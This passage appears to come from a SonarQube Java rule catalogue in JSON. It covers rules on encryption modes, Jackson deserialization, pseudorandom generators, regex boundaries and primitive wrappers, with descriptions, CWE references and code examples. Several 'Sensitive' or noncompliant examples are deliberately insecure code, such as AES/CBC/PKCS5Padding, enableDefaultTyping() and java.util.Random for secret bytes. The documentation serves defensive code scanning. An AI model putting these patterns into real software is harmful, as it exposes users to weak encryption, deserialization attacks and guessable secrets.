with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === javax.crypto ===\nimport javax.crypto.Cipher;\nCipher c = Cipher.getInstance(...);  // Sensitive\n\n// === apache.commons.crypto ===\nimport java.util.Properties;\nimport org.apache.commons.crypto.utils.Utils;\nimport org.apache.commons.crypto.cipher.CryptoCipherFactory;\nimport org.apache.commons.crypto.cipher.CryptoCipherFactory.CipherProvider;\n\nProperties properties = new Properties();\nproperties.setProperty(CryptoCipherFactory.CLASSES_KEY, CipherProvider.OPENSSL.getClassName());\nfinal String transform = \"AES/CBC/PKCS5Padding\";\nUtils.getCipherInstance(transform, properties);  // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/321.html\">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/322.html\">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/323.html\">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/324.html\">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/325.html\">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS4426'>S4426</a>, <a href='/coding_rules#rule_key=java%3AS5542'>S5542</a>, <a href='/coding_rules#rule_key=java%3AS5547'>S5547</a> instead.</p>",
            "mdDesc": "<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p> </p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n// === javax.crypto ===\nimport javax.crypto.Cipher;\nCipher c = Cipher.getInstance(...);  // Sensitive\n\n// === apache.commons.crypto ===\nimport java.util.Properties;\nimport org.apache.commons.crypto.utils.Utils;\nimport org.apache.commons.crypto.cipher.CryptoCipherFactory;\nimport org.apache.commons.crypto.cipher.CryptoCipherFactory.CipherProvider;\n\nProperties properties = new Properties();\nproperties.setProperty(CryptoCipherFactory.CLASSES_KEY, CipherProvider.OPENSSL.getClassName());\nfinal String transform = \"AES/CBC/PKCS5Padding\";\nUtils.getCipherInstance(transform, properties);  // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/321.html\">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/322.html\">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/323.html\">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/324.html\">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/325.html\">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use {rule:java:S4426}, {rule:java:S5542}, {rule:java:S5547} instead.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S1158",
            "repo": "java",
            "name": "Primitive wrappers should not be instantiated only for \"toString\" or \"compareTo\" calls",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo</code> method is\ninefficient.</p>\n<p>Instead, the static <code>toString()</code> or <code>compare</code> method of the primitive wrapper class should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nnew Integer(myInteger).toString();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nInteger.toString(myInteger);        // Compliant\n</pre>",
            "mdDesc": "<p>Creating temporary primitive wrapper objects only for <code>String</code> conversion or the use of the <code>compareTo</code> method is\ninefficient.</p>\n<p>Instead, the static <code>toString()</code> or <code>compare</code> method of the primitive wrapper class should be used.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nnew Integer(myInteger).toString();  // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nInteger.toString(myInteger);        // Compliant\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2127",
            "repo": "java",
            "name": "\"Double.longBitsToDouble\" should not be used for \"int\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the\nmathematical conversion into a <code>double</code> simply won't work as anticipated because the layout of the bits will be interpreted incorrectly, as\nif a child were trying to use an adult's gloves.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 42;\ndouble d = Double.longBitsToDouble(i);  // Noncompliant\n</pre>",
            "mdDesc": "<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the\nmathematical conversion into a <code>double</code> simply won't work as anticipated because the layout of the bits will be interpreted incorrectly, as\nif a child were trying to use an adult's gloves.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint i = 42;\ndouble d = Double.longBitsToDouble(i);  // Noncompliant\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S4544",
            "repo": "java",
            "name": "Using unsafe Jackson deserialization configuration is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995\">CVE-2017-4995</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362\">CVE-2018-19362</a> </li>\n</ul>\n<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, \"deserialization gadgets\"\nmay allow an attacker to perform remote code execution. </p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or\n  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>\n  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class or field levels and configured with <code>use = JsonTypeInfo.Id.CLASS)</code>\n  or <code>use = Id.MINIMAL_CLASS</code>. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You configured the Jackson deserializer as mentioned above. </li>\n  <li> The serialized data might come from an untrusted source. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered \"deserialization gadgets\". </li>\n  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>\n  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =\n  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping(); // Sensitive\n</pre>\n<pre>\n@JsonTypeInfo(use = Id.CLASS) // Sensitive\nabstract class PhoneNumber {\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">Deserialization of untrusted data</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062\">On Jackson CVEs: Don’t\n  Panic</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-15095\">CVE-2017-1509</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-7525\">CVE-2017-7525</a> </li>\n  <li> Derived from FindSecBugs rule <a\n  href=\"https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION\">JACKSON_UNSAFE_DESERIALIZATION</a> </li>\n</ul>",
            "mdDesc": "<p>Using unsafe Jackson deserialization configuration is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-4995\">CVE-2017-4995</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19362\">CVE-2018-19362</a> </li>\n</ul>\n<p>When Jackson is configured to allow Polymorphic Type Handling (aka PTH), formerly known as Polymorphic Deserialization, \"deserialization gadgets\"\nmay allow an attacker to perform remote code execution. </p>\n<p>This rule raises an issue when:</p>\n<ul>\n  <li> <code>enableDefaultTyping()</code> is called on an instance of <code>com.fasterxml.jackson.databind.ObjectMapper</code> or\n  <code>org.codehaus.jackson.map.ObjectMapper</code>. </li>\n  <li> or when the annotation <code>@JsonTypeInfo</code> is set at class or field levels and configured with <code>use = JsonTypeInfo.Id.CLASS)</code>\n  or <code>use = Id.MINIMAL_CLASS</code>. </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You configured the Jackson deserializer as mentioned above. </li>\n  <li> The serialized data might come from an untrusted source. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use the latest patch versions of <code>jackson-databind</code> blocking the already discovered \"deserialization gadgets\". </li>\n  <li> Avoid using the default typing configuration: <code>ObjectMapper.enableDefaultTyping()</code>. </li>\n  <li> If possible, use <code>@JsonTypeInfo(use = Id.NAME)</code> instead of <code>@JsonTypeInfo(use = Id.CLASS)</code> or <code>@JsonTypeInfo(use =\n  Id. MINIMAL_CLASS)</code> and so rely on <code>@JsonTypeName</code> and <code>@JsonSubTypes</code>. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping(); // Sensitive\n</pre>\n<pre>\n@JsonTypeInfo(use = Id.CLASS) // Sensitive\nabstract class PhoneNumber {\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization\">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization\n  </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/index.php/Deserialization_of_untrusted_data\">Deserialization of untrusted data</a> </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/502.html\">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>\n  <li> <a href=\"https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062\">On Jackson CVEs: Don’t\n  Panic</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-15095\">CVE-2017-1509</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-7525\">CVE-2017-7525</a> </li>\n  <li> Derived from FindSecBugs rule <a\n  href=\"https://find-sec-bugs.github.io/bugs.htm#JACKSON_UNSAFE_DESERIALIZATION\">JACKSON_UNSAFE_DESERIALIZATION</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "owasp-a8"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S5996",
            "repo": "java",
            "name": "Regex boundaries should not be used in a way that can never be matched",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In regular expressions the boundaries <code>^</code> and <code>\\A</code> can only match at the beginning of the input (or, in case of\n<code>^</code> in combination with the <code>MULTILINE</code> flag, the beginning of the line) and <code>$</code>, <code>\\Z</code> and <code>\\z</code>\nonly at the end.</p>\n<p>These patterns can be misused, by accidentally switching <code>^</code> and <code>$</code> for example, to create a pattern that can never\nmatch.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// This can never match because $ and ^ have been switched around\nPattern.compile(\"$[a-z]+^\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"^[a-z]+$\");\n</pre>",
            "mdDesc": "<p>In regular expressions the boundaries <code>^</code> and <code>\\A</code> can only match at the beginning of the input (or, in case of\n<code>^</code> in combination with the <code>MULTILINE</code> flag, the beginning of the line) and <code>$</code>, <code>\\Z</code> and <code>\\z</code>\nonly at the end.</p>\n<p>These patterns can be misused, by accidentally switching <code>^</code> and <code>$</code> for example, to create a pattern that can never\nmatch.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n// This can never match because $ and ^ have been switched around\nPattern.compile(\"$[a-z]+^\"); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nPattern.compile(\"^[a-z]+$\");\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2245",
            "repo": "java",
            "name": "Using pseudorandom number generators (PRNGs) is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>\nmethod should not be used for security-critical applications or for protecting sensitive data. In such context, the\n<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically strong random number generator (RNG) like \"java.security.SecureRandom\" in place of this PRNG. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nRandom random = new Random(); // Sensitive use of Random\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/338.html\">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator\n  (PRNG) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/330.html\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/oTdGBQ\">CERT, MSC02-J.</a> - Generate strong random numbers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
            "mdDesc": "<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386\">CVE-2013-6386</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419\">CVE-2006-3419</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102\">CVE-2008-4102</a> </li>\n</ul>\n<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that\nwill be generated, and use this guess to impersonate another user or access sensitive information.</p>\n<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>\nmethod should not be used for security-critical applications or for protecting sensitive data. In such context, the\n<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such\n  as a password, is hashed. </li>\n  <li> the function you use generates a value which can be predicted (pseudo-random). </li>\n  <li> the generated value is used multiple times. </li>\n  <li> an attacker can access the generated value. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a cryptographically strong random number generator (RNG) like \"java.security.SecureRandom\" in place of this PRNG. </li>\n  <li> Use the generated random values only once. </li>\n  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nRandom random = new Random(); // Sensitive use of Random\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases\nbyte bytes[] = new byte[20];\nrandom.nextBytes(bytes);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/338.html\">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator\n  (PRNG) </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/330.html\">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/326.html\">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/oTdGBQ\">CERT, MSC02-J.</a> - Generate strong random numbers </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UNcxBQ\">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/2ns-BQ\">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM\">Predictable Pseudo Random Number\n  Generator</a> </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a3"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
